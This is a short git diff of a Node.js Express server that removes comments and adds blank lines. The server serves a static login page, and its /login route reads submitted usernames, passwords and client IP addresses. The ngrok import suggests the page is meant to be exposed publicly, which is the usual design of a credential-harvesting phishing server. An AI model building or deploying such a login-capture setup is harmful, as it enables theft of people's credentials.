@@ -5,11 +5,9 @@ const ngrok = require("ngrok");
 const app = express();
 const PORT = 3000;
 
-// Serve static files, including index.html
 app.use(express.static(__dirname));
 app.use(bodyParser.json());
 
-// Handle login form submission
 app.post("/login", (req, res) => {
   const { username, password } = req.body;
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -25,7 +23,9 @@ app.post("/login", (req, res) => {
   });
 });
 
-// Start the server
+
 app.listen(PORT, async () => {
   console.log(`Server running on http://localhost:${PORT}`);
 });
+
+
